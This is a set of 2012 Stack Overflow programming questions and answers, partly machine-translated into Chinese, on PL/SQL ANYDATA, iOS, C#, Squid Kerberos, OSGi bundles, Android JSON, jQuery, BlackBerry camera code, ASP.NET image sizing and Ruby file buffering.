# oracle - PLSQL 中的反射？

> ID：10220737
> 
> 赞同：9
> 
> 时间：2012-04-19T02:12:02.983
> 
> 标签：oracle, plsql, user-defined-types

我正在编写一个程序来处理存储在 ANYDATA 中的用户定义对象。对象类型和属性名称只能在运行时知道，所以我不能在声明部分为它定义可变量。在Java中，我可以使用反射来处理它，我可以知道类名和字段名。然后我可以通过反射访问这些字段。有没有办法像这样在PLSQL中做到这一点？我现在的想法是在过程中动态创建一个 sql 字符串并执行它。但这不是我想要的。

假设用户 A 将 ADT 类型定义为`create or replace type Person_type as object (fname varchar2(10), lname varchar2(10));`并创建一个对象实例并将其插入 ANYDATA。

在我的过程中，不知何故我知道我需要处理这个对象的第一个属性，即 fname。因此，如果首先知道 adt 类型，我的代码将如下所示：

```
declare
  adobject A.Person_type; -- HERE! I don't know the type yet, so I can't define adobject!
  tempAnydata anydata;
  rt number;
  vbuffer varchar2(10);
  ...
begin
   select somecolumn 
   into tempAnydata 
   from sometable 
   where something='something' for update;

   rt := tempAnydata.GetObject(adobject);

   vbuffer := adobject.fname; -- HERE! I don't know the attribute name is fname!
   -- deal with vbuffer here
end; 
```

那么我应该怎么做才能使它动态呢？提前致谢。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-20T04:13:38.533

您需要使用`ANYTYPE`来描述`ANYDATA`并确保类型正确。`piecewise`然后您可以使用和访问该属性`getVarchar2`。

下面的大部分代码用于检查类型，如果您不关心类型安全，则不需要。

**返回值的函数：**

```
create or replace function get_first_attribute(
    p_anydata in out anydata --note the "out" - this is required for the "piecewise"
) return varchar2 is
    v_typecode pls_integer;
    v_anytype anytype;
begin
    --Get the typecode, and the ANYTYPE
    v_typecode := p_anydata.getType(v_anytype);

    --Check that it's really an object
    if v_typecode = dbms_types.typecode_object then
        --If it is an object, find the first item
        declare
            v_first_attribute_typecode pls_integer;
            v_aname          varchar2(32767);
            v_result         pls_integer;
            v_varchar        varchar2(32767);
            --Variables we don't really care about, but need for function output
            v_prec           pls_integer; 
            v_scale          pls_integer;
            v_len            pls_integer;
            v_csid           pls_integer;
            v_csfrm          pls_integer;
            v_attr_elt_type  anytype;
        begin
            v_first_attribute_typecode := v_anytype.getAttrElemInfo(
                pos            => 1, --First attribute
                prec           => v_prec,
                scale          => v_scale,
                len            => v_len,
                csid           => v_csid,
                csfrm          => v_csfrm,
                attr_elt_type  => v_attr_elt_type,
                aname          => v_aname);

            --Check typecode of attribute
            if v_first_attribute_typecode = dbms_types.typecode_varchar2 then
                --Now that we've verified the type, get the actual value.
                p_anydata.piecewise;
                v_result := p_anydata.getVarchar2(c => v_varchar);

                --DEBUG: Print the attribute name, in case you're curious
                --dbms_output.put_line('v_aname: '||v_aname);

                return v_varchar;
            else
                raise_application_error(-20000, 'Unexpected 1st Attribute Typecode: '||
                    v_first_attribute_typecode);
            end if;
        end;
    else
        raise_application_error(-20000, 'Unexpected Typecode: '||v_typecode);
    end if;
end;
/ 
```

**类型：**

```
create or replace type Person_type as object (fname varchar2(10), lname varchar2(10));

create or replace type other_type as object (first_name varchar2(10), poetry clob); 
```

**测试运行：**

```
declare
    --Create records
    v_type1 person_type := person_type('Ford', 'Prefect');
    v_type2 other_type := other_type('Paula', 'blah blah...');
    v_anydata anydata;
begin
    --Convert to ANYDATA.
    --Works as long as ANYDATA is an object with a varchar2 as the first attribute.
    v_anydata := anydata.convertObject(v_type1);
    dbms_output.put_line(get_first_attribute(v_anydata));

    v_anydata := anydata.convertObject(v_type2);
    dbms_output.put_line(get_first_attribute(v_anydata));
end;
/ 
```

输出：

```
Ford
Paula 
```

# ios - Ui imageview picker image disappears when navigating from page

> ID：10220740
> 
> 赞同：1
> 
> 时间：2012-04-19T02:12:28.740
> 
> 标签：ios, ios5, uiimageview

I have a Ui image view that selects a photo form cameraroll to display in my app, when I move away form the page it disappears. Any way to hold onto it when page is navigated away from?

xcode 4.3 Thanks

```
- (void)imagePickerController:(UIImagePickerController *)picker didFinishPickingMediaWithInfo:(NSDictionary *)info {
[picker dismissModalViewControllerAnimated:YES];
imageView.image = [info objectForKey:@"UIImagePickerControllerOriginalImage"];

- (IBAction)getPhoto:(id)sender {

UIImagePickerController * picker = [[UIImagePickerController alloc] init];
picker.delegate = self;

if((UIButton *) sender == choosePhotoBtn) {
    picker.sourceType = UIImagePickerControllerSourceTypeSavedPhotosAlbum;
}

[self presentModalViewController:picker animated:YES]; 
```

# c# - Need help checking an array for duplicate entries while filling it up

> ID：10220743
> 
> 赞同：0
> 
> 时间：2012-04-19T02:12:55.207
> 
> 标签：c#, arrays, methods, overriding, parent

I am trying to figure out a way to search and check an array while filling it up. I want to use the overloaded equals method I have created from another class.

Here is the overloaded equals method in the public class Order : IComparable

```
public override bool Equals(object obj)
    {

            Order temp = (Order)obj;
        if (orderNumber == temp.orderNumber)
            return true;
        else 
            return false;

    } 
```

in main, I try to create the 2 arrays so I can compare 1 to the other and check for dups as I go through with a nested for loop but it is not working. It just continues filling the array as if it never saw the second for loop

```
public static void Main()

    {
    //Create an array of five ShippedOrder objects. 
        ShippedOrder[] myShippedOrder = new ShippedOrder[5];
        ShippedOrder[] checkDup = new ShippedOrder[5];

    //Prompt the user for values for each Orders object; do NOT allow duplicate order numbers and force the user to reenter 
    //    the order when a duplicate order number is entered.

            for (int x = 0; x < myShippedOrder.Length; ++x)
            {

                int y = 0;
                myShippedOrder[x] = new ShippedOrder();
                checkDup[y] = new ShippedOrder();

                Console.Write("Please enter the order number for order {0}:  ", x + 1);
                checkDup[y].orderNumber = Convert.ToInt32(Console.ReadLine());             

                for (y = 0; y < checkDup.Length; ++y)
                {
                    if (checkDup[y] != null && myShippedOrder[x].Equals(checkDup[y]))
                    {
                        Console.WriteLine("Sorry, this order number has already been entered, please try again");
                        --x;
                        break;
                    }
                    else myShippedOrder[x].orderNumber = checkDup[y].orderNumber;
                }

                Console.Write("Please enter the customers name for order {0}:  ", x + 1);
                myShippedOrder[x].customerName = Console.ReadLine();

                Console.Write("Please enter the quantity that was ordered for order {0}:  ", x + 1);
                myShippedOrder[x].quantityOrdered = Convert.ToInt32(Console.ReadLine());

                myShippedOrder[x].totalPrice = myShippedOrder[x].quantityOrdered * PRICEEACH + ShippedOrder.SHIPFEE;

        } 
```

any suggestions on how to use the overloaded equal method in the order class to help in finding duplicate orderNumbers if they exist and kick back to the user they entered an invalid order and to try again with that spot in the array?

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:21:08.753

这里发生的事情是`continue`当用户输入错误时您需要这样做。

尝试这个：

```
public static void Main()

{
//Create an array of five ShippedOrder objects. 
    ShippedOrder[] myShippedOrder = new ShippedOrder[5];
    ShippedOrder[] checkDup = new ShippedOrder[5];

//Prompt the user for values for each Orders object; do NOT allow duplicate order numbers and force the user to reenter 
//    the order when a duplicate order number is entered.

        bool wronginput = false;
        for (int x = 0; x < myShippedOrder.Length; ++x)
        {

            int y = 0;
            myShippedOrder[x] = new ShippedOrder();
            checkDup[y] = new ShippedOrder();

            Console.Write("Please enter the order number for order {0}:  ", x + 1);
            checkDup[y].orderNumber = Convert.ToInt32(Console.ReadLine());             

            for (y = 0; y < checkDup.Length; ++y)
            {
                if (checkDup[y] != null && myShippedOrder[x].Equals(checkDup[y]))
                {
                    Console.WriteLine("Sorry, this order number has already been entered, please try again");
                    --x;
                    wronginput = true;
                    break;
                }
                else myShippedOrder[x].orderNumber = checkDup[y].orderNumber;
            }

            if(wronginput)
                continue;

            Console.Write("Please enter the customers name for order {0}:  ", x + 1);
            myShippedOrder[x].customerName = Console.ReadLine();

            Console.Write("Please enter the quantity that was ordered for order {0}:  ", x + 1);
            myShippedOrder[x].quantityOrdered = Convert.ToInt32(Console.ReadLine());

            myShippedOrder[x].totalPrice = myShippedOrder[x].quantityOrdered * PRICEEACH + ShippedOrder.SHIPFEE;

    } 
```

请注意我是如何添加`wronginput`的，以便在第二个 for 循环之后立即返回到外部循环的开头。

我认为这就是你现在正在寻找的东西，即使有更好的方法来做你正在做的事情来检查重复。

# active-directory - Squid kerberos authentication

> ID：10220745
> 
> 赞同：0
> 
> 时间：2012-04-19T02:13:29.007
> 
> 标签：active-directory, centos, kerberos, squid

I am running a squid proxy server (CentOS 5) that I am trying to get working with kerberos through our AD server (Windows Server 2008).

I have followed the instructions here: [http://wiki.squid-cache.org/ConfigExamples/Authenticate/Kerberos](http://wiki.squid-cache.org/ConfigExamples/Authenticate/Kerberos)

To setup a keytab for the server, which has all worked perfectly.

The problem occurs when I attempt to use the proxy from a client PC, where it immediately falls back to basic authentication.

If I use the ip address of the proxy I receive this message in cache.log:

> authenticateNegotiateHandleReply: Error validating user via Negotiate. Error returned 'BH received type 1 NTLM token'

If I use the domain name of the proxy I receive this message in cache.log:

> authenticateNegotiateHandleReply: Error validating user via Negotiate. Error returned 'BH gss_acquire_cred() failed: Unspecified GSS failure. Minor code may provide more information. Configuration file does not specify default realm'

If I run klist on the client it has a ticket for the proxy server listed.

Thanks in advance!

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-31T22:33:30.597

您需要在其中的帮助程序中指定 spn `squid.conf` With the`-s http/fqdn@REALM`

# maven - Apache Felix 下 OSGi Bundle 中的依赖关系不可用 (ClassNotFound)

> ID：10220753
> 
> 赞同：1
> 
> 时间：2012-04-19T02:14:44.047
> 
> 标签：maven, osgi, bundle, classnotfoundexception

我正在尝试在由 maven 构建的 OSGi Bundle 中使用 Apache Commons JCI 库。我在 Apache Felix 上安装了捆绑包，一切看起来都很好，直到我尝试启动我的组件，这就是我收到以下错误的时候。我的 pom.xml 看起来像：

```
<Embed-Dependency>jtidy;scope=compile|runtime;inline=false</Embed-Dependency>
<Embed-Directory>target/dependency</Embed-Directory>
<Embed-StripGroup>true</Embed-StripGroup>

<Export-Package>
    ${project.artifactId}.*;version=${project.version},
    org.apache.jsp.apps.*;version=${project.version}
</Export-Package>                        

<Import-Package>*;resolution:=optional</Import-Package>
<Private-Package></Private-Package>

<Include-Resource>
    {maven-resources},
    {maven-dependencies},
    src/main/scripts
</Include-Resource> 
```

我只是依赖于：

```
 <dependency>
        <groupId>org.apache.commons</groupId>
        <artifactId>commons-jci-core</artifactId>
        <version>1.0</version>
    </dependency> 
```

我尝试将 commons-jci-core 显式添加到 Embed-Dependency 和 Import-Pacakage 指令中，但无济于事。任何想法如何嵌入此依赖项以便我的包可以看到它？

这是我收到的错误：

```
18.04.2012 22:08:01.328 *ERROR* [FelixPackageAdmin] com.activecq.tools [com.activecq.tools.services.impl.VaultSyncImpl] Error during instantiation of the implementation object (java.lang.NoClassDefFoundError: org/apache/commons/jci/monitor/FilesystemAlterationListener) java.lang.NoClassDefFoundError: org/apache/commons/jci/monitor/FilesystemAlterationListener
    at java.lang.Class.getDeclaredConstructors0(Native Method)
    at java.lang.Class.privateGetDeclaredConstructors(Class.java:2389)
    at java.lang.Class.getConstructor0(Class.java:2699)
    at java.lang.Class.newInstance0(Class.java:326)
    at java.lang.Class.newInstance(Class.java:308)
    at org.apache.felix.scr.impl.manager.ImmediateComponentManager.createImplementationObject(ImmediateComponentManager.java:183)
    at org.apache.felix.scr.impl.manager.ImmediateComponentManager.createComponent(ImmediateComponentManager.java:118)
    at org.apache.felix.scr.impl.manager.AbstractComponentManager$Unsatisfied.activate(AbstractComponentManager.java:997)
    at org.apache.felix.scr.impl.manager.AbstractComponentManager.activateInternal(AbstractComponentManager.java:333)
    at org.apache.felix.scr.impl.manager.AbstractComponentManager.enable(AbstractComponentManager.java:157)
    at org.apache.felix.scr.impl.config.ConfiguredComponentHolder.enableComponents(ConfiguredComponentHolder.java:262)
    at org.apache.felix.scr.impl.BundleComponentActivator.loadDescriptor(BundleComponentActivator.java:253)
    at org.apache.felix.scr.impl.BundleComponentActivator.initialize(BundleComponentActivator.java:147)
    at org.apache.felix.scr.impl.BundleComponentActivator.<init>(BundleComponentActivator.java:111)
    at org.apache.felix.scr.impl.Activator.loadComponents(Activator.java:285)
    at org.apache.felix.scr.impl.Activator.bundleChanged(Activator.java:203)
    at org.apache.felix.framework.util.EventDispatcher.invokeBundleListenerCallback(EventDispatcher.java:807)
    at org.apache.felix.framework.util.EventDispatcher.fireEventImmediately(EventDispatcher.java:729)
    at org.apache.felix.framework.util.EventDispatcher.fireBundleEvent(EventDispatcher.java:610)
    at org.apache.felix.framework.Felix.fireBundleEvent(Felix.java:3724)
    at org.apache.felix.framework.Felix.startBundle(Felix.java:1772)
    at org.apache.felix.framework.Felix$RefreshHelper.restart(Felix.java:4498)
    at org.apache.felix.framework.Felix.refreshPackages(Felix.java:3554)
    at org.apache.felix.framework.PackageAdminImpl.run(PackageAdminImpl.java:336)
    at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.ClassNotFoundException: org.apache.commons.jci.monitor.FilesystemAlterationListener not found by com.activecq.tools [170]
    at org.apache.felix.framework.ModuleImpl.findClassOrResourceByDelegation(ModuleImpl.java:787)
    at org.apache.felix.framework.ModuleImpl.access$400(ModuleImpl.java:71)
    at org.apache.felix.framework.ModuleImpl$ModuleClassLoader.loadClass(ModuleImpl.java:1768)
    at java.lang.ClassLoader.loadClass(ClassLoader.java:247)
    ... 25 more 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:23:11.640

事实证明我需要嵌入：

```
<Embed-Dependency>
    commons-jci-fam;scope=compile|runtime;inline=false,
    commons-jci-core;scope=compile|runtime;inline=false
</Embed-Dependency> 
```

FilesystemAlterationListener在fam项目中，其他依赖需要core项目。

# android - JSONArray 从结果中列出另一个数组？

> ID：10220758
> 
> 赞同：0
> 
> 时间：2012-04-19T02:15:01.453
> 
> 标签：android, json

我需要能够从我已经拥有的 JSONArray 创建一个新的 JSONArray，在数组中我有很多称为 id 的字段，每行还有一个，我如何获得它们的列表？

例如。我把这个拿回来

```
[{"id":111,"users":"blob"},
 {"id":111,"users":"blob"},
 {"id":111,"users":"blob"},
 {"id":111,"users":"blob"},
 {"id":111,"users":"blob"},
 {"id":111,"users":"blob"}] 
```

我将如何获得仅 ID 的列表？

* * *

*   编辑

决定在此之后直接使用 for 循环，但谢谢：D

```
HttpResponse response = httpclient.execute(httpget); //execute the HttpPost request
JSONArray jsa =  projectResponse(response); //get the json response

for(int i = 0; i < jsa.length(); i++){
    JSONObject jso = jsa.getJSONObject(i);
    publishProgress(jso.getString("id"), jso.getString("name"));
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-19T02:29:58.513

试试这个：

```
JSONArray yourJSONArray;
List<String> tempIDStringCollection = new List<String>();
...

for(int i = 0; i < yourJSONArray.length(); i++){
        String id = yourJSONArray.getJSONObject(i).getString("id");
        tempIDStringCollection.add(id);
} 
```

然后将其传输到另一个 JSONArray，尝试：

```
JSONArray newArray = new JSONArray(tempIDStringCollection); 
```

要跳过`List`创建，请尝试

```
JSONArray yourJSONArray;
JSONArray newArray = new JSONArray();
...

for(int i = 0; i < yourJSONArray.length(); i++){
        String id = yourJSONArray.getJSONObject(i).getString("id");
        newArray.put(i, id);
} 
```

# jquery - 无法使用 jQuery .get() 获取 html 内容

> ID：10220769
> 
> 赞同：3
> 
> 时间：2012-04-19T02:16:22.780
> 
> 标签：jquery, asp.net, get

我想获取另一个页面的 html 内容，所以我使用下面的 jquery .get() 函数

```
$.get("chk_vga.aspx", function(data) {
    alert($('#vga').html());
}); 
```

在“chk_vga.aspx”页面中，它只有一个值

```
<html>
    <body>
        <div id="vga">F</div>
    </body>
</html> 
```

我的 jquery 函数如何获得“F”值？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-19T02:18:08.567

```
.load('chk_vga.aspx #vga', function(data) {
    alert(data);
}); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:20:27.193

在这里，您正在做的是父级`alert()`的`#vga`内部 HTML。如果您使用此代码，您将在远程页面上获得#vga div 的#vga 内部HTML。

```
$.get('chk_vga.aspx', function(data) {
    alert(data.match(/id="vga">(.[^\"]*)<\/div>/i)[1]);            
}); 
```

或者

```
$.get('chk_vga.aspx', function(data) {
    alert(data);
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:21:14.867

要访问内容，您需要将其添加到元素中。

```
$.get("chk_vga.aspx", function(data) {
    var foo = jQuery("<div></div>").html(data).find("#vga").html();
    alert(foo);
}); 
```

# blackberry - 在黑莓中拍照

> ID：10220775
> 
> 赞同：2
> 
> 时间：2012-04-19T02:17:36.913
> 
> 标签：blackberry, camera, blackberry-simulator

我是黑莓的新手。我在创建一个从黑莓相机拍照的程序时遇到了麻烦。我使用了 Blackberry 开发人员站点提供的示例代码[代码示例：在 BlackBerry 设备应用程序中拍照](http://docs.blackberry.com/en/developers/deliverables/17968/CS_take_a_picture_in_a_BB_device_app_1228202_11.jsp)。我在构建此代码时没有遇到任何问题，但是，它既没有在模拟器上运行，也没有在黑莓手机上运行。这是我正在使用的代码。请帮我！谢谢！

```
package mypackage;

import net.rim.device.api.amms.control.camera.*;
import net.rim.device.api.ui.*;
import net.rim.device.api.ui.component.*;
import net.rim.device.api.ui.container.*;
import javax.microedition.media.*;
import javax.microedition.media.control.*;

public class ImageCaptureDemo extends UiApplication {
    public static void main(String[] args) {
        ImageCaptureDemo app = new ImageCaptureDemo();
        app.enterEventDispatcher();
    }

    public ImageCaptureDemo() {
        pushScreen(new ImageCaptureDemoScreen());
    }

    class ImageCaptureDemoScreen extends MainScreen {
        Player _p;
        VideoControl _videoControl;

        public ImageCaptureDemoScreen() {
            try {
                _p = javax.microedition.media.Manager
                        .createPlayer("capture://video?encoding=jpeg&width=1024&height=768");
                _p.realize();
                _videoControl = (VideoControl) _p.getControl("VideoControl");

                if (_videoControl != null) {
                    Field videoField = (Field) _videoControl.initDisplayMode(
                            VideoControl.USE_GUI_PRIMITIVE,
                            "net.rim.device.api.ui.Field");
                    _videoControl.setDisplayFullScreen(true);
                    _videoControl.setVisible(true);
                    _p.start();

                    EnhancedFocusControl efc = (EnhancedFocusControl) _p
                            .getControl("net.rim.device.api.amms.control.camera.EnhancedFocusControl");
                    efc.startAutoFocus();

                    if (videoField != null) {
                        add(videoField);
                    }
                }
            } catch (Exception e) {
                Dialog.alert(e.toString());
            }
        }

        protected boolean invokeAction(int action) {
            boolean handled = super.invokeAction(action);

            if (!handled) {
                if (action == ACTION_INVOKE) {
                    try {
                        byte[] rawImage = _videoControl.getSnapshot(null);
                    } catch (Exception e) {
                        Dialog.alert(e.toString());
                    }
                }
            }
            return handled;
        }
    }
} 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-19T04:32:04.630

```
public  class CameraScreen extends MainScreen
{
    private VideoControl _videoControl;
    private Field _videoField;
    private EncodingProperties[] _encodings;    
    private int _indexOfEncoding = 0;
    private ZoomControl _zoomControl;
    CameraScreen cameraScreen;
    public CameraScreen()
    {
        cameraScreen= this;
        initializeCamera();
        initializeEncodingList();
        if(_videoField != null)
        {
            createUI();
        }
        else
        {
            add( new RichTextField( "Error connecting to camera." ) );
        }
    }
    protected boolean touchEvent(TouchEvent event)
    {
        if(event.getEvent() == TouchEvent.GESTURE)
        {
            TouchGesture gesture = event.getGesture();
            if(gesture.getEvent() == TouchGesture.SWIPE)
            {
                final int direction = gesture.getSwipeDirection();
                UiApplication.getApplication().invokeLater(new Runnable()
                {
                    public void run()
                    {
                        if(direction == TouchGesture.SWIPE_NORTH)
                        {
                            _zoomControl.setDigitalZoom(ZoomControl.NEXT);
                        }
                        else if(direction == TouchGesture.SWIPE_SOUTH)
                        {
                            _zoomControl.setDigitalZoom(ZoomControl.PREVIOUS);
                        }
                    }
                });

                return true;
            }
        }

        return false;
    }

    public void takePicture()
    {
        try
        {
            String encoding = null;            

            if( _encodings != null )
            {
                encoding = _encodings[_indexOfEncoding].getFullEncoding();
            }
            createImageScreen( _videoControl.getSnapshot( encoding ) );
        }
        catch(Exception e)
        {
        }  
    }

    protected boolean onSavePrompt()
    {
        return true;
    }

    /**
     * Initializes the Player, VideoControl and VideoField
     */
    private void initializeCamera()
    {
        try
        {
            Player player = Manager.createPlayer( "capture://video" );
            player.realize();
            _videoControl = (VideoControl)player.getControl( "VideoControl" );

            if (_videoControl != null)
            {
                _videoField = (Field) _videoControl.initDisplayMode (VideoControl.USE_GUI_PRIMITIVE, "net.rim.device.api.ui.Field");
                _videoControl.setDisplayFullScreen(true);
                _videoControl.setVisible(true);
            }

            player.start();
        }
        catch(Exception e)
        {
        }
    }

    /**
     * Initialize the list of encodings
     */
    private void initializeEncodingList()
    {
        try
        {
            String encodingString = System.getProperty("video.snapshot.encodings");
            String[] properties = StringUtilities.stringToKeywords(encodingString);
            Vector encodingList = new Vector();
            String encoding = "encoding";
            String width = "width";
            String height = "height";
            EncodingProperties temp = null;

            for(int i = 0; i < properties.length ; ++i)
            {
                if( properties[i].equals(encoding))
                {
                    if(temp != null && temp.isComplete())
                    {
                        // Add a new encoding to the list if it has been
                        // properly set.
                        encodingList.addElement( temp );
                    }
                    temp = new EncodingProperties();

                    // Set the new encoding's format
                    ++i;
                    temp.setFormat(properties[i]);
                }
                else if( properties[i].equals(width))
                {
                    // Set the new encoding's width
                    ++i;
                    temp.setWidth(properties[i]);
                }
                else if( properties[i].equals(height))
                {
                    // Set the new encoding's height
                    ++i;
                    temp.setHeight(properties[i]);
                }

            }

            // If there is a leftover complete encoding, add it.
            if(temp != null && temp.isComplete())
            {
                encodingList.addElement( temp );
            }

            // Convert the Vector to an array for later use
            _encodings = new EncodingProperties[ encodingList.size() ];
            encodingList.copyInto((Object[])_encodings);
        }
        catch (Exception e)
        {
            // Something is wrong, indicate that there are no encoding options
            _encodings = null;
        }
    }

    /**
     * Adds the VideoField to the screen
     */
    private void createUI()
    {
        // Add the video field to the screen
        add(_videoField);
    }

    /**
     * Create a screen used to display a snapshot
     * @param raw A byte array representing an image
     */
    private void createImageScreen( byte[] raw )
    {    
        UiApplication.getUiApplication().popScreen(cameraScreen);
        ImageScreen imageScreen = new ImageScreen( raw );
        UiApplication.getUiApplication().pushScreen( imageScreen );
    }

    /**
     * Sets the index of the encoding in the 'encodingList' Vector
     * @param index The index of the encoding in the 'encodingList' Vector
     */
    public void setIndexOfEncoding(int index)
    {
        _indexOfEncoding = index;
    }

    /**
     * @see net.rim.device.api.ui.Screen#invokeAction(int)
     */   
    protected boolean invokeAction(int action)
    {
        boolean handled = super.invokeAction(action); 

        if(!handled)
        {
            switch(action)
            {
            case ACTION_INVOKE: // Trackball click
            {         
                takePicture();
                return true;
            }
            }
        }        
        return handled;                
    }
}

public static class ImageScreen extends MainScreen
{
    private static final int IMAGE_SCALING = 7;
    private static String FILE_NAME = System.getProperty("fileconn.dir.photos") + "IMAGE";
    private static String EXTENSION = ".bmp";
    private static int _counter;
    private ImageScreen _imageScreen;
    public ImageScreen( final byte[] raw )
    {
        _imageScreen = this;

        setTitle("IMAGE");
        Bitmap image = Bitmap.createBitmapFromBytes( raw, 0, -1, IMAGE_SCALING );

        HorizontalFieldManager hfm1 = new HorizontalFieldManager( Field.FIELD_HCENTER );
        HorizontalFieldManager hfm2 = new HorizontalFieldManager( Field.FIELD_HCENTER );

        BitmapField imageField = new BitmapField( image );
        hfm1.add( imageField );

        ButtonField photoButton = new ButtonField( "Save" );
        photoButton.setChangeListener( new SaveListener(raw) );
        hfm2.add(photoButton);

        ButtonField cancelButton = new ButtonField( "Cancel" );
        cancelButton.setChangeListener( new CancelListener() );
        hfm2.add(cancelButton);

        add( hfm1 );
        add( hfm2 );
    }
    protected boolean invokeAction(int action)
    {
        boolean handled = super.invokeAction(action); 

        if(!handled)
        {
            switch(action)
            {
            case ACTION_INVOKE: // Trackball click.
            {         
                return true;
            }
            }
        }        
        return handled;          
    }

    private class SaveListener implements FieldChangeListener
    {
        private byte[] _raw;

        SaveListener(byte[] raw)
        {
            _raw = raw;
        }

        public void fieldChanged(Field field, int context)
        {
            try
            {       
                FileConnection file = (FileConnection)Connector.open( FILE_NAME + _counter + EXTENSION );
                while( file.exists() )
                {
                    file.close();
                    ++_counter;
                    file = (FileConnection)Connector.open( FILE_NAME + _counter + EXTENSION );
                }

                file.create();
                OutputStream out = file.openOutputStream();
                out.write(_raw);

                out.close();
                file.close();
            }
            catch(Exception e)
            {
            }

            String full_path = FILE_NAME + _counter + EXTENSION;
            setOnBitmapField(full_path);
            selectedImagePath= full_path;
            ++_counter;

            UiApplication.getUiApplication().popScreen( _imageScreen );
        }
    }

    private class CancelListener implements FieldChangeListener
    {
        public void fieldChanged(Field field, int context)
        {
            UiApplication.getUiApplication().popScreen( _imageScreen );
        }
    }
} 
```

=======

```
public final class EncodingProperties
{   
    private String _format;
    private String _width;
    private String _height;
    private boolean _formatSet;
    private boolean _widthSet;
    private boolean _heightSet;    
    public void setFormat(String format)
    {
        _format = format;
        _formatSet = true;
    } 

public void setWidth(String width)
{
    _width = width;
    _widthSet = true;
}

public void setHeight(String height)
{
    _height = height;
    _heightSet = true;
}    

public String toString()
{
    StringBuffer display = new StringBuffer();

    display.append(_width);
    display.append(" x ");
    display.append(_height);
    display.append(" ");
    display.append(_format);                

    return display.toString();
}
public String getFullEncoding()
{
    StringBuffer fullEncoding = new StringBuffer();

    fullEncoding.append("encoding=");
    fullEncoding.append(_format);

    fullEncoding.append("&width=");
    fullEncoding.append(_width);

    fullEncoding.append("&height=");
    fullEncoding.append(_height);        

    return fullEncoding.toString();
}

public boolean isComplete()
{
    return _formatSet && _widthSet && _heightSet;
}
} 
```

# c# - 在 asp.net 中标准化 jpeg 大小

> ID：10220781
> 
> 赞同：1
> 
> 时间：2012-04-19T02:17:54.627
> 
> 标签：c#, asp.net, image

我正在为所有员工显示来自 SQL Server 数据库的图像。当这些图像存储在数据库中时，它们以不同的大小存储。一个尺寸较小，另一个尺寸较大。

当我说尺寸时，我指的是宽度和高度。

当我在 aspx 页面中显示它时，我想以 300X250 大小显示

我怎样才能做到这一点？如果我设置图像控件的高度和宽度，图像会失真。

请帮忙

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-19T02:29:30.820

看看 ImageResizer.net。它拥有您需要的一切，包括用于 SQL Server 集成和保留纵横比的裁剪的代码示例：

[http://imageresizing.net/](http://imageresizing.net/)

最受欢迎的功能是免费和开源的：

*   调整大小、裁剪、旋转、翻转
*   边框、阴影、填充、背景颜色
*   可调整的 Jpeg 压缩。多页 tiff 查看
*   动画 GIF 帧选择。全面的实时诊断
*   基本的 GIF 和 PNG 编码
*   梯度生成

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-19T02:22:49.420

如果设置 300x250 尺寸时图像失真，可能是因为纵横比不同。尝试设置宽度或高度。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-19T02:26:49.683

关于你的问题，你可以做几件事，

1.  您可以使用算法来调整图像大小，同时保持高度之间的 raito。您需要为旧图像和每个新图像运行它。这是一篇让您入门的文章：http: [//www.codeproject.com/Articles/13192/Image-Resizing-Maintaining-Height-Width-Ratio](http://www.codeproject.com/Articles/13192/Image-Resizing-Maintaining-Height-Width-Ratio)

2.  您可以对已存储在数据库中的所有图像运行代码，如果大于允许的限制，则可以裁剪它们。并为新上传的图像放置相同的裁剪机制。

3.  在显示图像时，您检查高度/宽度并仅在超出您所需的限制时将它们缩小。

对于所有方法，如果图像的高度/宽度小于您想要的高度/宽度，那么您只需将它们保持原样，否则它们会失真。

此外，我确实想告诉您，将图像以及就此而言，数据库中的任何其他文件都是不好的做法:(这是内存开销。更好的做法是将其放入文件系统中，您可以进一步谷歌查找这种方法的优点。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-19T02:22:37.333

1.  在您的 HTML 中，您应该指定文件的实际高度和宽度。

    如果不这样做，图像可能会失真，和/或呈现“锯齿”。

2.  如果您真的想制作 300x250 的图像，那么您需要使用[The Gimp](http://www.gimp.org)、Photoshop 或[ImageMagick](http://www.imagemagick.org)等工具来调整大小和/或裁剪到所需的高度和宽度。

# ruby - Ruby 会打开文件但不写入文件？

> ID：10220787
> 
> 赞同：2
> 
> 时间：2012-04-19T02:18:47.463
> 
> 标签：ruby, file, jruby, buffer

我正在尝试创建一个基本的 ruby​​ 刮板，它将从 html 源代码中抓取所有 8 个字母或更长的单词。然后它将这些保存在与单词的第一个字符相对应的文件中。看起来很简单吧？

```
 re = /\w{8,}/
    cre = /[a-z0-9]/
    a = b.html    #This grabs the html from the browser
    matchx = a.scan(re)
    matchx.each do |xx|
        word = xx.to_s.downcase.chomp
        fchar = word[0].chr

        if (fchar.match(cre)) #Not sure if I need this
            @pcount += 1
            fname = @WordsFName+fchar   #@WordsFName is a prefix
            tmpF = File.open(fname,"a+")

            #Check for duplicates, if not write to file
            exists = File.readlines(fname).any? { |li| li[word] }
            if (!exists)                    
                tmpF.write(word+"\n")
                print word 
                @wcount += 1
            end
        end

    end 
```

Ruby 成功抓取所有单词，获取第一个字符，并打开所有必要的文件，但无法写入。此外， print 方法打印所有单词，包括重复的单词，但检查 any? irb上的方法没有问题..

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-04-19T05:45:47.930

File#write 是缓冲的，您无需在写入和 File.readlines(fname) 之间刷新或关闭 tmpF，因此 readlines 在刷新之前永远不会看到输出。我没有看到任何关闭 tmpF 的调用，因此，除了文件对象最终确定时程序退出或 tmpF 超出范围后的某个时间 GC 之外，写入数据何时被刷新尚不清楚。

您可以在使用 写入后手动刷新，或者在打开后使用`tmpF.flush`默认行为。`tmpF.sync = true`

请注意，随着每个文件变大，重复检查的成本会随着它重新读取整个文件而膨胀。如果单词集适合内存，请考虑仅保留您看到的单词的哈希值，如果它大于内存中的存储容量，请考虑使用键值存储，而不是每次都重新读取串行文件。

